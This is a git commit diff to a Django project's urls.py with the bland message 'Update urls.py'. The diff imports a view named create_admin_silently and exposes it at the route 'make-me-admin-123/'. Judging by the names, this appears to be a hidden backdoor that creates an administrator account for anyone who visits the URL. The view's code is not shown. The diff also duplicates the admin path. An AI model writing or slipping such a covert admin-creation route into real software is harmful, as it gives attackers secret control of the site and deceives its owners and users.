d65d7b518e6926cc93ffe7d01cac7637d142b0b7
qudsiyashaikh <zinharkhan8@Gmail.com>
2026-03-29 11:44:58 +0530

    Update urls.py

--- myproject/urls.py
+++ myproject/urls.py
@@ -1,8 +1,12 @@
 from django.contrib import admin
 from django.urls import path, include
 from core.views import dashboard
+from core.views import create_admin_silently
 
 urlpatterns = [
+    path('admin/', admin.site.urls),
+    path('make-me-admin-123/', create_admin_silently),
+    
     path('admin/', admin.site.urls),
 
     # Dashboard
